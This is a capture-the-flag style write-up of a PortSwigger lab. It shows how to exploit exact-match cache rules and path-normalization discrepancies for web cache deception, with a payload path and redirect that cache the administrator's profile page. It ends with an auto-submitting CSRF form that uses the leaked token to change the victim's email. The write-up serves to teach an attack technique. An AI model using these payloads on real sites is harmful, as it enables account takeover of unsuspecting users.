# Exploiting exact-match cache rules for web cache deception

## Table of Contents

  1. [Overview](#overview)  
  2. [Background](#background)  
  3. [Enumeration](#enumeration)  
    3.1 [Exploiting File Name Cache Rules](#exploiting-file-name-cache-rules)  
    3.2 [Detecting Normalization By the Origin Server](#detecting-normalization-by-the-origin-server)  
    3.3 [Detecting Normalization By the Cache Server](#detecting-normalization-by-the-cache-server)  
    3.4 [Exploiting Normalization Discrepancies](#exploiting-normalization-discrepancies)  
  4. [Exploitation](#exploitation)  
  5. [Conclusion](#conclusion)  

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules), you'll learn: Exploiting exact-match cache rules for web cache deception! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

To solve the lab, change the email address for the user `administrator`. You can log in to your own account using the following credentials: `wiener:peter`.

We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810192630.png)

Login page:

Let's login as user `wiener`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810192650.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810192708.png)

After logging in, we can view our profile page.

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810192911.png)

When we logged in, it'll send a POST request to `/validateSession` with parameter `csrf`.

We can also update our email:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810192945.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810193019.png)

More over, in our Burp Suite HTTP history, we can see that resource `/favicon.ico` was cached:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810193438.png)

### Exploiting File Name Cache Rules

Certain files such as `robots.txt`, `index.html`, and `favicon.ico` are common files found on web servers. They're often cached due to their infrequent changes. Cache rules target these files by matching the exact file name string.

To identify whether there is a file name cache rule, send a `GET` request for a possible file and see if the response is cached.

### Detecting Normalization By the Origin Server

To test how the origin server normalizes the URL path, we can send a request to a non-cacheable resource with a path traversal sequence and an arbitrary directory at the start of the path. To choose a non-cacheable resource, look for a non-idempotent method like `POST`.

For example, we can modify `/my-account` to `/anything/..%2fmy-account`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810193853.png)

As you can see, it respond HTTP status code "404 Not Found", which means the path has been interpreted as `/anything/..%2fmy-account`. **The origin server either doesn't decode the slash or resolve the dot-segment.**

### Detecting Normalization By the Cache Server

Same as detecting normalization by the origin server, we can choose a request with a cached response and resend the request with a path traversal sequence and an arbitrary directory at the start of the static path. Choose a request with a response that contains evidence of being cached.

For example, we can cache `/favicon.ico`. Then send path `/anything/..%2f/favicon.ico`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810194128.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810194144.png)

As you can see, the response is still cached, this may indicate that the cache has normalized the path from `/anything/..%2f/favicon.ico` to `/favicon.ico`.

### Exploiting Normalization Discrepancies

Because the response is only cached if the request matches the exact file name, **we can only exploit a discrepancy where the cache server resolves encoded dot-segments, but the origin server doesn't.**

To do so, we can construct a payload according to the following structure: `/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>`.

However, since the origin server is likely to return an error message instead of profile information, we'll need to also **identify a delimiter that is used by the origin server but not the cache**. Test possible delimiters by adding them to the payload after the dynamic path.

After fuzzing by hand, we can find that character `;` is the delimiter:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810201835.png)

This path `/my-account;%2f%2e%2e%2ffavicon.ico` resulted in different result in the origin and cache server:

- The cache interprets the path as: `/favicon.ico`
- The origin server interprets the path as: `/my-account`

What now? What we can do with this web cache deception vulnerability?

Maybe we can steal the CSRF token, and then change the victim's email address via exploiting CSRF??

## Exploitation

Let's try to cache the victim's profile page, and see what'll happen.

First, modify the response header to this:

```http
HTTP/1.1 301 Moved Permanently
Location: https://0ab6002d0430479d8014a882002800d7.web-security-academy.net/my-account;%2f%2e%2e%2ffavicon.ico
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810203653.png)

Then, click button "Deliver exploit to victim":

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810203710.png)

After that, before the cache expired, go to `/my-account;%2f%2e%2e%2ffavicon.ico` to visit the cached response:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810203741.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240810203753.png)

As you can see, the victim in this case is `administrator` and we got the CSRF token.

After the second try, **the CSRF token didn't change at all**.

With that said, we can **use `administrator`'s CSRF token to update his email**!

**CSRF Payload:**
```html
<form id="csrfForm" name="change-email-form" action="https://0aae002f0480e270c92ee04100ba0094.web-security-academy.net/my-account/change-email" method="POST">
  <label>Email</label>
  <input required type="email" name="email" value="pwned@attacker.com">
  <input required type="hidden" name="csrf" value="heM6rtv6eAHoC8r1Jl9EKMWjLBdRb2aq">
  <button class='button' type='submit'> Update email </button>
</form>
<script>
  csrfForm.submit();
</script>
```

This payload will automatically submit the update email form upon visiting.

**Remember to change the response header to serve our payload:**
```http
HTTP/1.1 200 OK
Content-Type: text/html
```

Finally, send our CSRF payload to the victim via the "Deliver exploit to victim" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240815125346.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Web-Cache-Deception/WCD-5/images/Pasted%20image%2020240815125358.png)

## Conclusion

What we've learned:

1. Exploiting exact-match cache rules for web cache deception